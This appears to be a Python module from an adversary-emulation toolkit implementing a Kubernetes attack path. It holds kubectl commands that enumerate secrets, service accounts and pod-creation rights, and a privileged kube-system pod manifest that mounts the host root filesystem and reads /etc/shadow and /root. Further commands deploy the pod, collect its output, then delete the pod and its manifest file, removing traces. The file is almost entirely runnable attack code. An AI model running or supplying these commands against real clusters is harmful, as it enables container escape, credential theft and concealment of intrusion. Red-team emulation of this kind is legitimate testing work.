"""
Kubernetes Attack Path (T1613, T1610)

Enumerate cluster and create privileged pod for host escape.
Mirrors the HuggingFace incident's cluster lateral movement.
"""

K8S_ENUM_COMMANDS = [
    "echo '=== K8S ENUM ==='",
    "kubectl version --client 2>/dev/null",
    "kubectl config current-context 2>/dev/null",
    "kubectl get namespaces 2>/dev/null",
    "kubectl get pods --all-namespaces 2>/dev/null",
    "kubectl get secrets --all-namespaces 2>/dev/null | head -20",
    "kubectl get serviceaccounts --all-namespaces 2>/dev/null | head -20",
    "kubectl get nodes 2>/dev/null",
    "kubectl auth can-i create pods --namespace kube-system 2>/dev/null",
    "kubectl auth can-i create pods --namespace default 2>/dev/null",
]

# Privileged pod manifest — escapes to host node
PRIVILEGED_POD_MANIFEST = """apiVersion: v1
kind: Pod
metadata:
  name: phantom-pipeline-escape
  namespace: kube-system
  labels:
    app: phantom-debug
spec:
  hostPID: true
  hostNetwork: true
  hostIPC: true
  containers:
  - name: escape
    image: alpine:latest
    command: ["/bin/sh", "-c"]
    args:
    - >
      mkdir -p /mnt/host &&
      mount /dev/$(ls /dev/sd* /dev/vd* 2>/dev/null | head -1 | xargs basename) /mnt/host &&
      cat /mnt/host/etc/shadow 2>/dev/null ||
      chroot /mnt/host /bin/sh -c 'cat /etc/shadow; ls /root/'
    securityContext:
      privileged: true
    volumeMounts:
    - name: host-root
      mountPath: /mnt/host
  volumes:
  - name: host-root
    hostPath:
      path: /
  restartPolicy: Never
"""

K8S_ESCAPE_COMMANDS = [
    "echo '=== K8S ESCAPE ==='",
    f"cat > /tmp/phantom_pod.yaml << 'PODEOF'\n{PRIVILEGED_POD_MANIFEST}PODEOF",
    "kubectl apply -f /tmp/phantom_pod.yaml 2>/dev/null",
    "sleep 5",
    "kubectl logs phantom-pipeline-escape -n kube-system 2>/dev/null",
    "kubectl delete pod phantom-pipeline-escape -n kube-system 2>/dev/null || true",
    "rm /tmp/phantom_pod.yaml",
]
